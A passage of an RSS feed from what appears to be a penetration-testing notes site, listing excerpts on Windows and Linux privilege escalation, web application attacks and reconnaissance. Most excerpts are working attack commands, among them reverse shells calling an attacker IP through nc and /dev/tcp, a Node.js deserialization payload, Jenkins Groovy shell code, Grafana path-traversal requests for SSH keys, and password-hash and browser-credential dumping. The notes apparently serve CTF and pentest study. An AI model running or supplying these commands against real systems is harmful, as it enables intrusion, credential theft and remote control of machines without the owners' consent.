      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-disk-management/</guid>
      <description>Partitions linkCheck partitions with it.&#xA;Open the &amp;lsquo;Disk Management&amp;rsquo;&#xA;Right click the partition to view the properties&#xA;Check &amp;lsquo;Security&amp;rsquo; tab or &amp;lsquo;Shadow Copies&amp;rsquo; tab&#xA;Check Partition in Windows Explorer&#xA;Right click the partition and click &amp;lsquo;Change Drive Letter and Paths&amp;rsquo; Open dialog. Click &amp;lsquo;Add&amp;rsquo;. In the dropdown, choose a letter (ex. Z:) and click &amp;lsquo;OK&amp;rsquo;. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.</description>
    </item>
    <item>
      <title>Dumping Windows Password Hashes</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</guid>
      <description>Commands linkUsing Credentials link impacket-secretsdump example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys). impacket-secretsdump -just-dc example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only). impacket-secretsdump -just-dc-ntlm example.local/username:password@&amp;lt;target-ip&amp;gt; Using NTDS file or Hives link # -ntds: NTDS.DIT file to parse # -system: SYSTEM hive to parse impacket-secretsdump -ntds ntds.dit -system system LOCAL # -sam: SAM hive to parse # -security: SECURITY hive to parse # -system: SYSTEM hive to parse impacket-secretsdump -sam sam.</description>
    </item>
    <item>
      <title>Iperius Backup Service Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</guid>
      <description>Investigation linkFirst check if Iperius is running in target machine.&#xA;wmic service list | findstr &amp;#34;Iperius&amp;#34; If the Iperius service is running, we can gain access to administrator privilege.&#xA;Exploitation link1. Create a Payload linkIn target machine, create a .bat file named &amp;ldquo;exploit.bat&amp;rdquo;.&#xA;@echo off C:\Users\&amp;lt;USERNAME&amp;gt;\Downloads\nc.exe &amp;lt;attack_machine_ip&amp;gt; 1337 -e exploit.exe Then place it to Desktop.&#xA;When saving, be sure to save it as the file type &amp;ldquo;All Files&amp;rdquo; (NOT .txt).</description>
    </item>
    <item>
      <title>Netlogon Elavasion of Privilege</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</guid>
      <description>Exploitation linkThere is a lot of Poc in online.&#xA;Here, we’ll use this repository from GitHub.</description>
    </item>
    <item>
      <title>Windows PrivEsc with Unquoted Service Path</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</link>
      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</guid>
      <description>Investigation linkIn target machine, find unquoted service path.&#xA;wmic service get name,displayname,pathname,startmode | findstr /i &amp;#34;Auto&amp;#34; | findstr /i /v &amp;#34;C:\\Windows\\&amp;#34; | findstr /i /v &amp;#34;&amp;#34;&amp;#34; &amp;#34; Also query the configuration information for a service.&#xA;sc qc &amp;#34;Development Service&amp;#34; For instance if the service path is &amp;ldquo;C:\Program Files\Development Files\Devservice Files\Service.exe&amp;rdquo;, we can place the exploit to &amp;ldquo;C:\Program Files\Devservice.exe&amp;rdquo; by ignoring paths after a space.&#xA;Exploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.</description>
    </item>
    <item>
      <title>Cockpit CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</guid>
      <description>Enumeration &amp;amp; Remote Code Execution (RCE) &amp;amp; Reverse Shell link # Reset password (CVE-2020-35847) msf&amp;gt; use exploit/multi/cockpit_cms_rce msf&amp;gt; set USER admin msf&amp;gt; run Version Detection linkCockpit CMS version is displayed as the value of “data-version” attribute in html tag.&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34; data-base=&amp;#34;/&amp;#34; data-route=&amp;#34;/&amp;#34; data-version=&amp;#34;0.11.1&amp;#34; data-locale=&amp;#34;en&amp;#34;&amp;gt; Common Directories link /auth/check # We can enumerate users using the path /auth/forgotpassword /auth/index /auth/login /auth/requestreset # We can enumerate users using the path </description>
    </item>
    <item>
      <title>Concrete CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</guid>
      <description>Default Credentials linkThe default username is “admin” in Concrete5.</description>
    </item>
    <item>
      <title>Snapd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
    </item>
    <item>
      <title>Sudo ClamAV Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/</guid>
      <description>Investigation linkIf we can execute “clamscan” command as root as below,&#xA;sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results we can read sensitive files by applying the custom yara rule.&#xA;Exploitation link1. Create a Yara Rule linkFirst off, check the location in which the yara file can be created.&#xA;find / -name &amp;#34;clam*&amp;#34; 2&amp;gt;/dev/null For instance, assume we can create the yara file under /var/lib/clamav/.&#xA;Create the yara rule in there.&#xA;Assume we want to read /etc/shadow, so specify the string “root” because the /etc/shadow contains “root” user name.</description>
    </item>
    <item>
      <title>Sudo Dstat Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/</guid>
      <description>dstat is a versatile tool for generating system resource statistics.&#xA;It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.&#xA;Investigation link sudo -l (ALL) NOPASSWD: /usr/bin/dstat If we can execute &amp;ldquo;dstat&amp;rdquo; command as root, we can gain access to privileges by using our malicious plugin.&#xA;Exploitation link1. Create a New Dstat Plugin linkFirst off, find locate the &amp;ldquo;dstat&amp;rdquo; directory.&#xA;find / -type d -name dstat 2&amp;gt;/dev/null Assume the location of dstat is “/usr/local/share/dstat”.</description>
    </item>
    <item>
      <title>Sudo Exiftool Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/</guid>
      <description>Investigation link (root) NOPASSWD: /usr/local/bin/exiftool If we can execute &amp;ldquo;exiftool&amp;rdquo; command as root, we can gain access to privileges.&#xA;Arbitrary Code Execution (CVE-2021-22204) version 7.44+ linkReference: https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/&#xA;Check the exiftool version.&#xA;If the exiftool version is later than 7.44, we can execute arbitrary code.&#xA;exiftool -ver Exploitation linkIn local machine, create the payload in a file named “exploit”.&#xA;(metadata &amp;#34;\c${system(&amp;#39;/bin/sh&amp;#39;)};&amp;#34;) Next, compress the file.&#xA;bzz exploit exploit.bzz Then create the DjVu file using the compressed file.</description>
    </item>
    <item>
      <title>Sudo Fail2ban Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</guid>
      <description>Fail2ban is an intrusion prevention software framework.&#xA;It prevents against brute force attacks.&#xA;Investigation link sudo -l (root) NOPASSWD: /etc/init.d/fail2ban restart If we can execute &amp;ldquo;fail2ban&amp;rdquo; as root, we can gain access to privileges by modifying the configuration file.&#xA;We need to check if the config file is writable.&#xA;find /etc -writable -ls 2&amp;gt;/dev/null 4 drwxrwx--- 2 root security 4096 Oct 16 08:57 /etc/fail2ban/action.d Look inside of &amp;quot;/etc/fail2ban/jail.conf&amp;quot; to know more about how fail2ban is configured.</description>
    </item>
    <item>
      <title>Sudo Path Traversal Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) /usr/bin/node /usr/local/scripts/*.js If the file path uses wildcards, we may execute arbitrary files.&#xA;In short, we can refer to files in different directories which the system owner unintended.&#xA;Exploitation linkAssume we can execute ‘node’ command as root and js file.&#xA;Create the “test.js” under /tmp, which spawns a root shell after executing ‘node’ command.&#xA;// /tmp/test.js require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;/bin/sh&amp;#34;, {stdio: [0, 1, 2]}) Now run ‘node’ command as root.</description>
    </item>
    <item>
      <title>Sudo Reboot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: /usr/sbin/reboot If we can execute &amp;ldquo;reboot&amp;rdquo; command as root, we can escalate to privileges.&#xA;Exploitation link1. Find Service Config Files Which Are Writable linkWe need to look for the system service config file which are writable.&#xA;find / -writable -name &amp;#34;*.service&amp;#34; 2&amp;gt;/dev/null /etc/systemd/system/example.service 2. Insert a Payload linkIf we find a writable file, we can inject a payload into Service.ExecStart.&#xA;# /etc/systemd/systm/example.service [Unit] Description=Zeno monitoring [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash; chmod &amp;#43;xs /home/&amp;lt;username&amp;gt;/bash&amp;#39; [Install] WantedBy=multi-user.</description>
    </item>
    <item>
      <title>Sudo Screen Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/screen -r testsession If we can execute &amp;ldquo;screen&amp;rdquo; command as root, we can spawn a root shell from the screen session.&#xA;Exploitation linkFirst execute &amp;ldquo;screen&amp;rdquo; command as root, then a screen session will be start.&#xA;Now we can spawn a root shell by pressing “Ctrl+a+c” in the screen session.</description>
    </item>
    <item>
      <title>Sudo Shutdown, Poweroff Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASS: /usr/sbin/shutdown If we can execute &amp;ldquo;shutdown&amp;rdquo; command as root, we can gain access to privileges by overwriting the path of &amp;ldquo;poweroff&amp;rdquo;.&#xA;Exploitation linkFirst create /tmp/poweroff binary which invoke a shell.&#xA;echo /bin/sh &amp;gt; /tmp/poweroff # or echo /bin/bash &amp;gt; /tmp/poweroff Then change permissions of the file and add &amp;quot;/tmp&amp;quot; folder to PATH.&#xA;chmod &amp;#43;x /tmp/poweroff export PATH=/tmp:$PATH Now execute &amp;ldquo;shutdown&amp;rdquo; as root.&#xA;# Some SUID command sudo /usr/sbin/shutdown # Then you are root user root&amp;gt; /tmp/poweroff is executed and spawn a root shell.</description>
    </item>
    <item>
      <title>Sudo Vim Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: vim example.txt If we can execute &amp;ldquo;vim&amp;rdquo; command as root, we can execute the shell command in the vim editor.&#xA;Exploitation linkSimply run &amp;ldquo;vim&amp;rdquo; command as root.&#xA;sudo vim example.txt In Vim editor, we can run shell commands as root.&#xA;:r!whoami </description>
    </item>
    <item>
      <title>Sudo Wall Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: wall Exploitation link # Reverse shell sudo wall &amp;#34;$(bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;)&amp;#34; # Gets a SSH private key of another user sudo wall &amp;#34;$(cat /home/user/.ssh/id_rsa)&amp;#34; </description>
    </item>
    <item>
      <title>Sudo Wget Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /usr/bin/wget If we can execute &amp;ldquo;wget&amp;rdquo; as root, we may be able to escalate privileges.&#xA;Modify /etc/shadow linkGet &amp;quot;/etc/shadow&amp;quot; and generate a new hash passwd, then set it to the shadow file, next upload it.&#xA;That changes the root password.&#xA;1. Get the Content of /etc/shadow linkTo see the content of /etc/shadow, we can use netcat listener.&#xA;So First, start a listener in local machine.</description>
    </item>
    <item>
      <title>Windows Pivoting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/post-exploitation/window-pivoting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/post-exploitation/window-pivoting/</guid>
      <description>Enumerate Network linkAfter entering the target server, enumerate and search other networks.&#xA;Check the ARP Cache in Target Machine link arp.exe -a Check IP Addresses link Get-Content c:\Windows\System32\drivers\etc\hosts ipconfig /all Search Other Network Ranges linkNo content yet.</description>
    </item>
    <item>
      <title>X11 (X Window System) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/</guid>
      <description>Enumeration link nmap --script x11-access -p 6000 &amp;lt;target-ip&amp;gt; msf&amp;gt; use auxiliary/scanner/x11/open_x11 </description>
    </item>
    <item>
      <title>Browser in the Browser (BITB) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</guid>
      <description>Use Templates linkThis repository is useful for attacking.</description>
    </item>
    <item>
      <title>Mozilla Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</guid>
      <description>Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip&#xA;First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.&#xA;zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.&#xA;wget http://&amp;lt;target-ip&amp;gt;:8000/mozilla.zip unzip mozilla.zip Tar&#xA;If we cannot use zip, tar also can be used.</description>
    </item>
    <item>
      <title>OpenCATS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</link>
      <pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</guid>
      <description>Default Credentials link admin:admin admin:cats </description>
    </item>
    <item>
      <title>LXC/LXD (Linux Container/Daemon) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</link>
      <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</guid>
      <description>Basic Flow link Check if You are in the Lxd Group&#xA;If you belong to the Lxd group, you may be able to the root privileges.&#xA;groups id Check if Container Image Exists&#xA;List all images and check if a container image already exists.&#xA;lxc image list If there are not container, build a new image in your local machine.&#xA;git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the “alpine-*.</description>
    </item>
    <item>
      <title>Restaurant Management System (RMS) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</link>
      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</guid>
      <description>Remote Code Execution (RCE) v1.0 linkSee the Exploit-DB for details.&#xA;python3 rms-rce.py https://example.com/rms/ When uploading successfully, we can access to https://example.com/rms/images/reverse-shell.php?cmd=id</description>
    </item>
    <item>
      <title>WebAnno Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</link>
      <pubDate>Tue, 24 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</guid>
      <description>Default Credentials link admin:admin Reverse Shell linkIf the target system opens the website assoated with WebAnno service, we can execute reverse shell by uploading the payload and access to the webpage hosts the payload.&#xA;1. Go to the Upload Screen in Dashboard link Login Click “Projects”. Select the project in left pane. Click Documents tab. 2. Prepare Payload linkWebAnno allows us to upload arbitrary file format, so we can upload PHP file for reverse shell.</description>
    </item>
    <item>
      <title>Grafana Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</link>
      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</guid>
      <description>Default Credential link admin:admin admin:prom-operator Configuration File linkThe configuration file contains the admin credentials. See the “admin_user” and “admin_password” section in the file.&#xA;/etc/grafana/grafana.ini Path Traversal link curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.ini curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.bash_history curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.bash_history Getting a Shell vis JWT, Grafana Pod linkSome Grafana versions are vulnerable to Path Traversal. Kubernetes creates environment variables by default.</description>
    </item>
    <item>
      <title>WebDAV Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</link>
      <pubDate>Mon, 09 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</guid>
      <description>Enumeration link msfconsole msf&amp;gt; use auxiliary/scanner/http/webdav_scanner Default Credentials link wampp:xampp Reverse Shell link1. Check if the exploit can be uploaded link davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; 2. Upload the Reverse Shell Script linkIf we can upload the file e.g. PHP file, upload the script for reverse shell.&#xA;davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; -uploadfile shell.php -uploadloc shell.php 3. Get a Shell linkIn local machine, start listener for getting a shell.&#xA;nc -lvnp 4444 Now access to http://example.</description>
    </item>
    <item>
      <title>Node.js Deserialization Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</link>
      <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</guid>
      <description>Cookie Reverse Shell link1. Generate a Payload linkWe can use the online tools like RunKit to execute the node package.&#xA;If you want to do in your local environment, you need to install a npm package first.&#xA;mkdir test cd test npm install node-serialize Next, create the payload for serialization to execute a reverse shell.&#xA;For instance, the file is named “serialize.js”.&#xA;let y = { rce: function() { require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;local-ip&amp;gt; &amp;lt;local-port&amp;gt; &amp;gt;/tmp/f&amp;#39;, function(error, stdout, stderr) { console.</description>
    </item>
    <item>
      <title>Jenkins Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</link>
      <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</guid>
      <description>Brute Force Credentials link msfconsole msf &amp;gt; use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.&#xA;Opening Listener on Your Local Machine&#xA;nc -lvnp 4444 Login to Jenkins&#xA;Access &amp;ldquo;http://localhost:8080&amp;rdquo; in browser and login.&#xA;Click &amp;ldquo;Manage Jenkins&amp;rdquo; -&amp;gt; &amp;ldquo;Script Console&amp;rdquo;&#xA;Add the Payload in the Console&#xA;r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;Attacker_IP&amp;gt;/4444; cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
    </item>
    <item>
      <title>CRLF (Carriage Return Line Feed) Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</link>
      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>RDP (Remote Desktop Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</link>
      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</guid>
      <description>Enumeration link nmap --script rdp-enum-encryption -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp-ntlm-info -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp* -p 3389 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; rdp hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; rdp Connect linkRemmina linkRemmina is a remote desktop client for POSIX-based computer operating systems.&#xA;remmina # -c: Connect given URI or file remmina -c rdp://username@vulnerable.com remmina -c rdp://domain\\username@vulnerable.com remmina -c rdp://username:password@vulnerable.com # --------------------------------------------------------------------------------- # Settings # Keyboard mapping 1.</description>
    </item>
    <item>
      <title>Web Browser Settings for Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</link>
      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</guid>
      <description>Bypass Port Protection linkMany browsers don&amp;rsquo;t accept uncommon ports for HTTP (HTTPS). For example, when we attempt to access http://example.com:22, browsers present that it cannot be accessed.&#xA;To release such a restricted thing, we can edit the setting in browsers.&#xA;Firefox link Enter &amp;ldquo;about:config&amp;rdquo; in search bar. Input &amp;ldquo;network.security.ports.banned.override&amp;rdquo; in the form. Add the desired port (e.g. “22”) to string. </description>
    </item>
    <item>
      <title>IMINT (Image Intelligence) and GEOINT (Geospatial Intelligence)</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/imint-and-geoint/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/imint-and-geoint/</guid>
      <description>Basic Investigation link open example.jpg Google Dorks linkSearch the keyword which is found in the image.&#xA;Name Location (country, city, etc.) When does it open Reverse Image Search linkUpload the image in each search engine.&#xA;Bing Images&#xA;Google Images&#xA;Click the “Search by image” icon and upload the image.&#xA;Yandex Images&#xA;Video (mp4) Geolocation linkFFmpeg extracts every single frame from a video.&#xA;# -i: input file # %06d: followed by six digits e.</description>
    </item>
    <item>
      <title>Kibana Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</guid>
      <description>Vulnerabilities linkLocal File Inclusion (LFI) Version &amp;lt; 6.4.3 &amp;amp; 5.6.13 link curl http://&amp;lt;target-ip&amp;gt;:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../root.txt Remote Code Execution (RCE) Version &amp;lt; 6.6.0 linkReference: https://github.com/mpgn/CVE-2019-7609</description>
    </item>
    <item>
      <title>LAPS (Local Administrator Password Solution) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</guid>
      <description>Enumeration link msfconsole use post/windows/gather/credentials/enum_laps set session 2 exploit Obtain Administrator&amp;rsquo;s Password linkFirst, check if you are in the LAPS_Readers group.&#xA;net user &amp;lt;current-username&amp;gt; # Global Group memberships *LAPS_Readers Using Get-ADComputer linkGet-ADComputer gets the information of the Active Directory computer.&#xA;Get-ADComputer -Identity &amp;#39;&amp;lt;active-directory-computer-name&amp;gt;&amp;#39; -property &amp;#39;ms-mcs-admpwd&amp;#39; Using Get-LAPSPasswords.ps1 link Download the Payload in Local Machine&#xA;If you are in LAPS_Readers, you can get the administrator&amp;rsquo;s password using Get-LAPSPasswords.ps1{:target=&amp;quot;_blank&amp;quot;}{:rel=&amp;ldquo;noopener&amp;rdquo;}.&#xA;wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1 Transfer the Payload to Target Machine</description>
    </item>
    <item>
      <title>Social Engineering</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/social-engineering/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/social-engineering/</guid>
      <description>Investigate Emails/Phone Numbers link Have I Been Pwned&#xA;It checks if the email address or the phone number has been exposed.</description>
    </item>
    <item>
      <title>Tiny File Manager Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</guid>
